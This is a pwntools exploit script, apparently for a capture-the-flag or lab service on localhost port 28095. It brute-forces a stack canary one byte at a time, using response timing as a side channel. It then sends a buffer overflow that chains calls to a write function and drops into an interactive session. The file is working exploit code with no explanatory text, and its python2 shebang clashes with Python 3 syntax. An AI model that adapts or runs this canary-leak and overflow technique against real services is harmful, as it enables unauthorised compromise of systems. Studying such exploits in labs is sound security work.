#!/usr/bin/env python2

import os
import re
import sys
import time

from pwn import *

context.arch = "x86"
context.log_level ='error'
context.bits = 32


base_payload = b'A'*32 + b'\x00'

for i in range(0, 3):
    bestTime = 0
    bestValue = -1
    for j in range(0, 256):
       p = remote('localhost', 28095)
       payload = base_payload + j.to_bytes(1, 'little')
       sendTime = time.time()
       p.send(payload)
       p.recvuntil(b"feedback\n")
       timeDiff = time.time() - sendTime
       if(timeDiff > bestTime):
           bestTime = timeDiff
           bestValue = j
    base_payload += bestValue.to_bytes(1, 'little')

print(base_payload)
write_address = 0x80490e0
fd = 4

payload  = base_payload + b'A'*12
payload += p32(write_address)
payload += p32(4)
payload += p32(write_address)
payload += p32(4)

p = remote('localhost', 28095)
p.send(payload)
p.interactive()
